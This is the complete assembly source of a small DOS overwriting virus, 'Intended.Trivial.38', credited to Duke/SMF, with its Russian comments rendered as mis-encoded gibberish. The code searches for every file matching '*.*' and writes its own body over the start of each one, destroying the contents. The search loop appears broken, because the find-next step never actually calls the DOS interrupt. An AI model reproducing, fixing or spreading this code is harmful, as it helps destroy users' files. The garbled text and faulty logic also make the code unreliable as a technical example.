   ; Intended.Trivial.38 (c) by Duke/SMF

                   .model   tiny
                   .286
                   .code
                   org     100h
   virus_length    equ     finish - start      ;„«¨  ¢¨àãá 

   start  :                                    ;* ç «® ¢¨àãá 
                   mov     ah,4Eh              ;*®¨áª ¯¥à¢®£® ä ©« 
                   mov     dx,offset file_spec ;DX ãª §ë¢ ¥â   "*.*"
                   int     21h

   infect_file:
                   mov     ax,3D01h            ;Žâªàë¢ ¥¬ ä ©« ¤«ï § ¯¨á¨
                   mov     dx,9Eh              ;DX ãª §ë¢ ¥â    ©¤¥ë© ä ©«
                   int     21h

                   xchg    bx,ax               ;BX á®¤¥à¦¨â ä ©«®¢ë© handle

                   mov     ah,40h              ;”ãªæ¨ï § ¯¨á¨ ¢ ä ©«
                   mov     cl,virus_length     ;CL = áª®«ìª® ¡ ©â ¯¨á âì
                   mov     dx,offset start     ;DX =  ç «® ª®¤  ¢¨àãá 
                   int     21h

                   mov     ah,3Eh              ;‡ ªàë¢ ¥¬ ä ©«
                   int     21h

                   mov     ah,4Fh              ;*®¨áª á«¥¤ãîé¥£® ä ©« 
                   jnc     infect_file         ;…á«¨ ä ©«  ©¤¥, â® ¯®à ¦ ¥¬,
                   ret                         ;¢ ¯à®â¨¢®¬ á«ãç ¥ ª®¥æ à ¡®âë.

   file_spec       db      "*.*",0             ;Œ áª  ä ©«®¢ ¤«ï ¯®¨áª 

   finish  :                                   ;Š®¥æ ¢¨àãá 
                   end     start
